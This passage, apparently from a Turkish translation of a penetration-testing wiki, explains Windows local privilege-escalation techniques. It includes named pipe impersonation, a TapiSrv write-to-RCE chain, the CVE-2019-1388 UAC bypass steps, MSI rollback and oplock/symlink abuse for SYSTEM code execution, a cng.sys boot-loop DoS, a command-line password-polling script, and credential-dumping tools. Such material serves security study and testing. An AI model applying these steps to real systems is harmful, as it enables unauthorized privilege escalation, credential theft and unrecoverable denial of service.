**Pipe** olarak adlandırılan paylaşılan memory segment'leri, process communication ve data transfer'ını mümkün kılar.

Windows, ilgisiz process'lerin farklı network'ler üzerinden bile data paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sağlar. Bu yapı, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı client/server architecture'a benzer.

Data bir **client** tarafından pipe üzerinden gönderildiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden communication gerçekleştiren **privileged process**'i tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde bu process'in kimliğini benimseyerek **daha yüksek privilege elde etme** fırsatı sağlar. Böyle bir attack'in nasıl gerçekleştirileceğine dair talimatlar için [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) faydalı rehberler bulabilirsiniz.

Ayrıca aşağıdaki tool, **burp gibi bir tool ile named pipe communication'ı intercept etmenize** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu tool, privesc bulmak için tüm pipe'ları listeleyip görmenize olanak tanır:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv), server mode'da `\\pipe\\tapsrv` (MS-TRP) endpoint'ini açığa çıkarır. Remote authenticated client, mailslot tabanlı async event path'i abuse ederek `ClientAttach`'i, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir file'a arbitrary bir **4-byte write** gerçekleştirecek şekilde kullanabilir; ardından Telephony admin hakları elde edip service olarak arbitrary bir DLL load edebilir. Tam flow:

- `pszDomainUser` writable mevcut bir path olarak ayarlanmış şekilde `ClientAttach` → service, bu path'i `CreateFileW(..., OPEN_EXISTING)` aracılığıyla açar ve async event write'ları için kullanır.
- Her event, `Initialize` içindeki attacker-controlled `InitContext`'i bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app register edin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) aracılığıyla alın, ardından deterministic write'ları tekrarlamak için unregister/shutdown gerçekleştirin.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` grubuna kendinizi ekleyin, reconnect gerçekleştirin, ardından `GetUIDllName`'i arbitrary bir DLL path ile çağırarak `TSPI_providerUIIdentify`'ı `NETWORK SERVICE` olarak execute edin.

Daha fazla detay:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta stuff execute edebilen File Extension'ları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW`'ye forward edilen tıklanabilir Markdown link'leri, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya register edilmiş herhangi bir scheme) tetikleyebilir ve attacker-controlled file'ları current user olarak execute edebilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Password'lar için Command Line'ları Monitoring Etme**

Bir user olarak shell elde ettiğinizde, **credential'ları command line üzerinde geçiren** scheduled task'ler veya execute edilen diğer process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını capture eder ve mevcut state'i önceki state ile karşılaştırarak tüm farklılıkları output eder.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Süreçlerden parola çalma

## Düşük Ayrıcalıklı Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (console veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcı olarak bir terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir process'i çalıştırmak mümkündür.

Bu, aynı vulnerability ile hem ayrıcalıkları yükseltmeyi hem de UAC'yi bypass etmeyi mümkün kılar. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu zafiyetten yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Gerekli tüm dosyalara ve bilgilere aşağıdaki GitHub repository'sinden ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'leri** hakkında bilgi edinmek için şunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

Bu teknik [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır; exploit kodu [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) mevcuttur.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, Windows Installer'ın rollback özelliğinin kötüye kullanılarak uninstall işlemi sırasında meşru dosyaların malicious dosyalarla değiştirilmesine dayanır. Bunun için attacker'ın, `C:\Config.Msi` klasörünü hijack etmek üzere kullanılacak bir **malicious MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin uninstall işlemi sırasında rollback dosyalarını depolamak için kullanılır; bu rollback dosyaları, malicious payload içerecek şekilde değiştirilir.

Özetlenen teknik aşağıdaki gibidir:

1. **Aşama 1 – Hijack için hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Adım 1: MSI'ı yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece bir **non-admin user** bunu çalıştırabilir.
- Install işleminden sonra dosyaya ait bir **handle** açık bırakın.

- Adım 2: Uninstall işlemini başlatın
- Aynı `.msi` dosyasını uninstall edin.
- Uninstall işlemi dosyaları `C:\Config.Msi` klasörüne taşımaya ve bunları `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu tespit etmek için açık dosya handle'ını `GetFinalPathNameByHandle` kullanarak **poll** edin.

- Adım 3: Custom Syncing
- `.msi`, aşağıdakileri yapan bir **custom uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` dosyası yazıldığında sinyal verir.
- Ardından uninstall işlemine devam etmeden önce başka bir event üzerinde **wait** eder.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
- Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın silinmesini **engeller**.
- Ardından uninstall işleminin tamamlanabilmesi için geri sinyal gönderin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içerikleri silemediği için `C:\Config.Msi` kaldırılmaz.

- Adım 5: `.rbf` dosyasını manuel olarak silin
- Siz (attacker) `.rbf` dosyasını manuel olarak silin.
- Artık `C:\Config.Msi` boştur ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Aşama 2 – Rollback script'lerini malicious olanlarla değiştirme**

- Adım 6: `C:\Config.Msi` klasörünü zayıf ACL'lerle yeniden oluşturun
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **weak DACLs** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` yetkisine sahip bir **handle**'ı açık tutun.

- Adım 7: Başka bir install çalıştırın
- `.msi` dosyasını aşağıdakilerle tekrar install edin:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu bir failure tetikleyen bir variable.
- Bu install, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini tekrar tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi` klasörünü izlemek için `ReadDirectoryChangesW` kullanın.
- Dosya adını alın.

- Adım 9: Rollback öncesi sync
- `.msi`, aşağıdakileri yapan bir **custom install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event sinyali gönderir.
- Ardından devam etmeden önce **wait** eder.

- Adım 10: Weak ACL'yi yeniden uygulayın
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` klasörüne **strong ACLs**'yi yeniden uygular.
- Ancak hâlâ `WRITE_DAC` yetkisine sahip bir handle tuttuğunuz için **weak ACLs**'yi tekrar uygulayabilirsiniz.

> ACL'ler **yalnızca handle open sırasında uygulanır**, bu nedenle klasöre hâlâ yazabilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
- `.rbs` dosyasının üzerine, Windows'a aşağıdakileri söyleyen **fake rollback script** yazın:
- `.rbf` dosyanızı (malicious DLL) **privileged location** konumuna geri yükleyin (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- **Malicious SYSTEM-level payload DLL** içeren fake `.rbf` dosyanızı bırakın.

- Adım 12: Rollback'i tetikleyin
- Sync event'ine sinyal göndererek installer'ın devam etmesini sağlayın.
- Bir **type 19 custom action (`ErrorOut`)**, install işlemini bilinen bir noktada **kasten başarısız** olacak şekilde yapılandırılmıştır.
- Bu durum rollback'in başlamasına neden olur.

- Adım 13: SYSTEM DLL'inizi install eder
- Windows Installer:
- Malicious `.rbs` dosyanızı okur.
- `.rbf` DLL dosyanızı hedef konuma kopyalar.
- Artık **SYSTEM tarafından yüklenen bir path içindeki malicious DLL**'e sahipsiniz.

- Son Adım: SYSTEM kodunu çalıştırın
- Hijack ettiğiniz DLL'i yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki vulnerability yalnızca **arbitrary file deletion**'a izin veriyorsa?

**NTFS internals**'ı exploit edebilirsiniz: her klasörün şu adlı gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **indeks meta verilerini** depolar.

Dolayısıyla bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele file/folder silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa** ne olur?

1. Adım 1: Bir yem klasörü ve file oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Ayrıcalıklı bir process `file1.txt` dosyasını silmeye çalıştığında oplock **execution'ı duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'i tetikle (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize verir.

4. Adım 4: Oplock callback'i içinde - silme işlemini yeniden yönlendir

- Seçenek A: `file1.txt` dosyasını başka bir yere taşı
- Bu işlem, oplock'u bozmadan `folder1` klasörünü boşaltır.
- `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'u zamanından önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştür:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS dahili stream'ini hedefler — bunu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakma
- SYSTEM process devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak artık junction + symlink nedeniyle aslında silinen:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS'a

**Dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile, **SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive'i exploit edin.

**Kritik bir Windows sürücüsünün** adıyla, dosya değil bir **klasör** oluşturun; örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows boot sırasında gerçek driver'ı yükleyemez.
- Ardından Windows, boot sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **boot işlemi çöker veya durur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma yapılamaz**.

### Privileged log/backup paths + OM symlinks kullanarak arbitrary file overwrite / boot DoS

Bir **privileged service**, log'ları/export'ları **writable config** içinden okunan bir path'e yazdığında, bu path'i **Object Manager symlinks + NTFS mount points** ile redirect ederek privileged write işlemini arbitrary overwrite'a dönüştürebilirsiniz (SeCreateSymbolicLinkPrivilege **olmadan bile**).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Target path'i depolayan config'in attacker tarafından writable olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu path'e yazan bir privileged operation (log, export, report).

**Örnek chain**
1. Privileged log destination'ı kurtarmak için config'i okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Path'i admin olmadan redirect edin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin log'u yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir servisin yazma amacıyla açacağı tüm korumalı dosyalara da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` yolundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir ve bozuk veriler için güvenilir bir DoS hedefi hâline gelir.



## **High Integrity'den SYSTEM'e**

### **New service**

Zaten bir High Integrity process üzerinde çalışıyorsanız, **SYSTEM'e giden yol** yalnızca **yeni bir service oluşturup çalıştırarak** kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process içinden **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
İlgili registry key'leri ve bir _.msi_ package'ın nasıl kurulacağı hakkında [daha fazla bilgi burada](#alwaysinstallelevated).

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privilege'larına sahipseniz (muhtemelen bunları zaten High Integrity olan bir process içinde bulacaksınız), SeDebug privilege'ı ile **neredeyse her process'i** (protected process'ler hariç) **açabilecek**, process'in **token'ını kopyalayabilecek** ve bu **token ile rastgele bir process oluşturabileceksiniz**.\
Bu technique genellikle **tüm token privilege'larına sahip SYSTEM olarak çalışan herhangi bir process** seçilerek kullanılır (_evet, tüm token privilege'larına sahip olmayan SYSTEM process'leri de bulabilirsiniz_).\
**Önerilen technique'i çalıştıran kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu technique, meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Technique, **bir pipe oluşturulmasını ve ardından bu pipe'a yazmak için bir service oluşturulmasını/kötüye kullanılmasını** içerir. Ardından, `SeImpersonate` privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) **token'ını taklit edebilir** ve SYSTEM privilege'ları elde edebilir.\
Name pipe'lar hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
Name pipe'ları kullanarak high integrity'den System'e **nasıl geçileceğine dair bir örnek** okumak istiyorsanız [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir **dll'i hijack etmeyi** başarırsanız, bu permission'larla rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation işlemleri için de kullanışlıdır; ayrıca **high integrity bir process'ten gerçekleştirilmesi çok daha kolaydır**, çünkü dll'leri yüklemek için kullanılan klasörlerde **write permission'larına** sahip olacaktır.\
**Dll hijacking hakkında** [**daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vector'lerini bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfiguration'ları ve sensitive file'ları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası misconfiguration'ları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfiguration'ları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı session bilgilerini çıkarır. Local ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credential'ları çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan password'ları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle tool'udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerability'lerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin rights gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerability'lerini arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Misconfiguration'ları aramak için host'u enumerate eder (privesc'ten çok bilgi toplama tool'udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda software'den credential'ları çıkarır (github'da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Misconfiguration kontrolü yapar (github'da precompiled executable). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası misconfiguration'ları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post temel alınarak oluşturulmuş tool (düzgün çalışmak için accesschk erişimi gerekmez ancak bunu kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET version'ını kullanarak compile etmeniz gerekir ([buna bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host üzerinde yüklü .NET version'ını görmek için şunu çalıştırabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetkileri yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - bir cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters için Windows Privilege Escalation Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifre çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Shadows'ta Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Link. Windows'ta Symbolic Links Kötüye Kullanımı](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPE için CLDFLT ve DirectX Kernel Race Conditions zincirleme kullanımı](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11'de Tam Bir Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes Kötüye Kullanılarak Privilege Escalation ve Diğer Harika Hileler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Bölüm 2: CVE-2020-1013, Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Bir Image Değişikliği Privilege Escalation'a Yol Açtığında](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Keys Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
